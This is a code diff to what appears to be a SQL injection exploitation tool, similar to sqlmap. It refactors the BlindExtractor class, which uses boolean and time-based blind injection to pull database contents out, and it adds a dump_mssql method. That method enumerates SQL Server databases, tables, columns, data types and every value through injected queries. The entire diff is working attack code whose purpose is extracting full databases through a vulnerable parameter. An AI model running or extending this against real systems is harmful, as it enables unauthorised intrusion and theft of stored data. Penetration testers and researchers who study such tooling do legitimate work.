@@ -10,6 +10,7 @@ from utils.constants import (
     RESET,
     YELLOW,
     InjectionContext,
+    fingerprints,
 )
 from utils.Logger import Logger
 from utils.parse import is_system_db
@@ -40,7 +41,6 @@ class BlindExtractor:
         self,
         param: str,
         ctx: InjectionContext,
-        column_count: int,
         boolInjection: bool,
         db_elem: str,
         expression: str,
@@ -56,7 +56,7 @@ class BlindExtractor:
             else self.time.get_db_elem_name_chars_at_index
         )
 
-        get_chars_at_index = (
+        get_number = (
             self.boolean.get_number_returned_by_sql
             if boolInjection
             else self.time.get_number_returned_by_sql
@@ -70,20 +70,25 @@ class BlindExtractor:
 
         # Test if we can get the element's name included in the injection's response body
         body_containing_name = self.union.test_expressions_name(
-            param, ctx, union_expression, column_count
+            param, ctx, union_expression
         )
 
         # Get the database element's name length
-        name_length_expression = f"LENGTH({expression})"
+        length_expression = fingerprints[self.database_engine.lower()].length
+        name_length_expression = length_expression.format(expression=expression)
+
         max_length = (
             HEIGH_COL_VALUE_LENGTH if db_elem == "value" else HEIGH_ELEMENT_NAME_LENGTH
         )
 
-        name_length = get_chars_at_index(param, ctx, name_length_expression, max_length)
+        name_length = get_number(param, ctx, name_length_expression, max_length)
 
         Logger.debug(
             f"Found database element's name length: {YELLOW}{name_length}{RESET}"
         )
+
+        if not name_length:
+            return ""
 
         # Better simply compute for each character if length is short
         if name_length < 5:
@@ -150,16 +155,15 @@ class BlindExtractor:
 
     def dump_db_elem_entries(
         self,
-        url: str,
         param: str,
         ctx: InjectionContext,
         column_count: int,
-        nulls: str,
         boolInjection: bool,
         db_elem: str,
         select: str,
         frm: str,
         where: str,
+        limit: str,
     ) -> list[str]:
         """
         Get the number of entries that the database element (table, column) has,
@@ -187,19 +191,23 @@ class BlindExtractor:
 
         # Find name for each database element's entry
         for elem in range(db_elem_count):
-            expression = f"({select} {frm} {where} LIMIT {elem},1)"
+            limit_expression1 = limit.format(nbr=elem)
+
+            expression = f"({select} {frm} {where} {limit_expression1})"
+
+            limit_expression2 = limit.format(nbr=elem + 1)
+
             # Limit is one further as it prints the first SELECT results at index 0
             union_expression = f"""
-                {select},{nulls}
+                {select},{self.union.get_nulls(self.database_engine, param, ctx, column_count)}
                 {frm}
                 {where}
-                LIMIT {elem + 1},1
+                {limit_expression2}
             """
 
             db_elem_name = self.find_db_elem_name(
                 param,
                 ctx,
-                column_count,
                 boolInjection,
                 db_elem,
                 expression,
@@ -215,11 +223,9 @@ class BlindExtractor:
 
     def dump_mysql(
         self,
-        url: str,
         param: str,
         ctx: InjectionContext,
         column_count: int,
-        nulls: str,
         boolInjection: bool,
     ) -> dict:
         """Dump all databases"""
@@ -231,16 +237,15 @@ class BlindExtractor:
           """
 
         db_names = self.dump_db_elem_entries(
-            url,
             param,
             ctx,
             column_count,
-            nulls,
             boolInjection,
             "database",
             "SELECT schema_name",
             "FROM information_schema.schemata",
             "",
+            fingerprints[self.database_engine.lower()].limit,
         )
 
         """
@@ -255,16 +260,15 @@ class BlindExtractor:
                 dump[db_name] = {}  # create an entry for the current database
 
                 table_names = self.dump_db_elem_entries(
-                    url,
                     param,
                     ctx,
                     column_count,
-                    nulls,
                     boolInjection,
                     "table",
                     "SELECT table_name",
                     "FROM information_schema.tables",
                     f"WHERE table_schema = {sql_db_name}",
+                    fingerprints[self.database_engine.lower()].limit,
                 )
 
                 """
@@ -276,16 +280,15 @@ class BlindExtractor:
 
                     sql_table_name = string_to_sql_char(table)
                     column_names = self.dump_db_elem_entries(
-                        url,
                         param,
                         ctx,
                         column_count,
-                        nulls,
                         boolInjection,
                         "column",
                         "SELECT column_name",
                         "FROM information_schema.columns",
                         f"WHERE table_schema = {sql_db_name} AND table_name = {sql_table_name}",
+                        fingerprints[self.database_engine.lower()].limit,
                     )
 
                     """
@@ -296,11 +299,9 @@ class BlindExtractor:
                         sql_col_name = string_to_sql_char(col)
 
                         data_types = self.dump_db_elem_entries(
-                            url,
                             param,
                             ctx,
                             column_count,
-                            nulls,
                             boolInjection,
                             "value",
                             "SELECT data_type",
@@ -308,14 +309,13 @@ class BlindExtractor:
                             f"WHERE table_schema = {sql_db_name} "
                             f"AND table_name = {sql_table_name} "
                             f"AND column_name = {sql_col_name}",
+                            fingerprints[self.database_engine.lower()].limit,
                         )
 
                         character_maximum_lengths = self.dump_db_elem_entries(
-                            url,
                             param,
                             ctx,
                             column_count,
-                            nulls,
                             boolInjection,
                             "value",
                             "SELECT character_maximum_length",
@@ -323,19 +323,19 @@ class BlindExtractor:
                             f"WHERE table_schema = {sql_db_name} "
                             f"AND table_name = {sql_table_name} "
                             f"AND column_name = {sql_col_name}",
+                            fingerprints[self.database_engine.lower()].limit,
                         )
 
                         values = self.dump_db_elem_entries(
-                            url,
                             param,
                             ctx,
                             column_count,
-                            nulls,
                             boolInjection,
                             "value",
                             f"SELECT `{col}`",
                             f"FROM `{db_name}`.`{table}`",
                             "",
+                            fingerprints[self.database_engine.lower()].limit,
                         )
 
                         dump[db_name][table][col] = {
@@ -351,11 +351,9 @@ class BlindExtractor:
 
     def dump_sqlite(
         self,
-        url: str,
         param: str,
         ctx: InjectionContext,
         column_count: int,
-        nulls: str,
         boolInjection: bool,
     ) -> dict:
         """Dump tables, columns, metadata, and values from a SQLite database."""
@@ -364,16 +362,15 @@ class BlindExtractor:
 
         # Get all user tables from SQLite's catalog.
         table_names = self.dump_db_elem_entries(
-            url,
             param,
             ctx,
             column_count,
-            nulls,
             boolInjection,
             "table",
             "SELECT name",
             "FROM sqlite_master",
             "WHERE type='table' AND name NOT LIKE 'sqlite_%'",
+            fingerprints[self.database_engine.lower()].limit,
         )
 
         for table in table_names:
@@ -383,16 +380,15 @@ class BlindExtractor:
 
             # Get column names and declared types.
             column_names = self.dump_db_elem_entries(
-                url,
                 param,
                 ctx,
                 column_count,
-                nulls,
                 boolInjection,
                 "column",
                 "SELECT name",
                 f"FROM pragma_table_info({sql_table})",
                 "",
+                fingerprints[self.database_engine.lower()].limit,
             )
 
             for column in column_names:
@@ -400,30 +396,28 @@ class BlindExtractor:
 
                 # Get the declared SQLite type.
                 data_types = self.dump_db_elem_entries(
-                    url,
                     param,
                     ctx,
                     column_count,
-                    nulls,
                     boolInjection,
                     "value",
                     "SELECT type",
                     f"FROM pragma_table_info({sql_table})",
                     f"WHERE name = {sql_column}",
+                    fingerprints[self.database_engine.lower()].limit,
                 )
 
                 # Get the actual column values.
                 values = self.dump_db_elem_entries(
-                    url,
                     param,
                     ctx,
                     column_count,
-                    nulls,
                     boolInjection,
                     "value",
                     f'SELECT "{column}"',
                     f'FROM "{table}"',
                     "",
+                    fingerprints[self.database_engine.lower()].limit,
                 )
 
                 # SQLite does not have an equivalent to
@@ -436,35 +430,166 @@ class BlindExtractor:
 
         return dump
 
-    def dump_db(
+    def dump_mssql(
         self,
-        database_engine: str,
-        url: str,
         param: str,
         ctx: InjectionContext,
         column_count: int,
-        nulls: str,
+        boolInjection: bool,
+    ) -> dict:
+        """Dump SQL Server databases, tables, columns, metadata and values."""
+
+        dump = {}
+
+        # Get database names
+        db_names = self.dump_db_elem_entries(
+            param,
+            ctx,
+            column_count,
+            boolInjection,
+            "database",
+            "SELECT name",
+            "FROM sys.databases",
+            "WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')",
+            fingerprints[self.database_engine.lower()].limit.format(element="name"),
+        )
+
+        for db_name in db_names:
+            dump[db_name] = {}
+
+            # Get tables
+            table_names = self.dump_db_elem_entries(
+                param,
+                ctx,
+                column_count,
+                boolInjection,
+                "table",
+                "SELECT TABLE_NAME",
+                "FROM INFORMATION_SCHEMA.TABLES",
+                f"WHERE TABLE_CATALOG = '{db_name}' AND TABLE_TYPE = 'BASE TABLE'",
+                fingerprints[self.database_engine.lower()].limit.format(
+                    element="TABLE_NAME"
+                ),
+            )
+
+            for table in table_names:
+                dump[db_name][table] = {}
+
+                # Get columns
+                column_names = self.dump_db_elem_entries(
+                    param,
+                    ctx,
+                    column_count,
+                    boolInjection,
+                    "column",
+                    "SELECT COLUMN_NAME",
+                    "FROM INFORMATION_SCHEMA.COLUMNS",
+                    f"WHERE TABLE_CATALOG = '{db_name}' "
+                    f"AND TABLE_NAME = '{table}'",
+                    fingerprints[self.database_engine.lower()].limit.format(
+                        element="COLUMN_NAME"
+                    ),
+                )
+
+                for col in column_names:
+                    # Data type
+                    data_types = self.dump_db_elem_entries(
+                        param,
+                        ctx,
+                        column_count,
+                        boolInjection,
+                        "value",
+                        "SELECT DATA_TYPE",
+                        "FROM INFORMATION_SCHEMA.COLUMNS",
+                        f"WHERE TABLE_CATALOG = '{db_name}' "
+                        f"AND TABLE_NAME = '{table}' "
+                        f"AND COLUMN_NAME = '{col}'",
+                        fingerprints[self.database_engine.lower()].limit.format(
+                            element="DATA_TYPE"
+                        ),
+                    )
+
+                    # Character maximum length
+                    character_maximum_lengths = self.dump_db_elem_entries(
+                        param,
+                        ctx,
+                        column_count,
+                        boolInjection,
+                        "value",
+                        "SELECT CHARACTER_MAXIMUM_LENGTH",
+                        "FROM INFORMATION_SCHEMA.COLUMNS",
+                        f"WHERE TABLE_CATALOG = '{db_name}' "
+                        f"AND TABLE_NAME = '{table}' "
+                        f"AND COLUMN_NAME = '{col}'",
+                        fingerprints[self.database_engine.lower()].limit.format(
+                            element="CHARACTER_MAXIMUM_LENGTH"
+                        ),
+                    )
+
+                    # Values
+                    #
+                    # QUOTENAME() is preferable when generating identifiers,
+                    # but if your existing UNION abstraction requires literal
+                    # identifiers, keep the identifier quoting consistent with
+                    # the rest of your implementation.
+                    values = self.dump_db_elem_entries(
+                        param,
+                        ctx,
+                        column_count,
+                        boolInjection,
+                        "value",
+                        f"SELECT [{col}]",
+                        f"FROM [{db_name}].[dbo].[{table}]",
+                        "",
+                        fingerprints[self.database_engine.lower()].limit.format(
+                            element=f"[{col}]"
+                        ),
+                    )
+
+                    dump[db_name][table][col] = {
+                        "data_type": data_types[0] if data_types else None,
+                        "character_maximum_length": (
+                            character_maximum_lengths[0]
+                            if character_maximum_lengths
+                            else None
+                        ),
+                        "values": values,
+                    }
+
+        return dump
+
+    def dump_db(
+        self,
+        param: str,
+        ctx: InjectionContext,
+        column_count: int,
         boolInjection: bool,
     ) -> dict:
         """
         Dump database according to its engine type
         """
 
-        if database_engine.lower() == "sqlite":
+        engine = self.database_engine.lower()
+
+        if engine == "sqlite":
             return self.dump_sqlite(
-                url,
                 param,
                 ctx,
                 column_count,
-                nulls,
+                boolInjection,
+            )
+
+        if engine == "microsoft sql server":
+            return self.dump_mssql(
+                param,
+                ctx,
+                column_count,
                 boolInjection,
             )
 
         return self.dump_mysql(
-            url,
             param,
             ctx,
             column_count,
-            nulls,
             boolInjection,
         )
